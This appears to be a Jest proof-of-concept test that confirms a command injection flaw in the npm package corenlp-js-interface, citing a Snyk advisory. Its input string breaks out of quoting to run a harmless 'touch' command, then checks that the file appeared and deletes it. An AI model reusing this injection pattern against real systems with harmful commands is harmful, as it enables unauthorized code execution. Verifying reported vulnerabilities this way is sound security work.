//https://snyk.io/vuln/SNYK-JS-CORENLPJSINTERFACE-1050435
test("Command Injection in corenlp-js-interface", () => 
{
	const a = require("corenlp-js-interface");
	const fs = require('fs');
	const path = './corenlp-js-interface';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a("') touch corenlp-js-interface # '","","","");
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
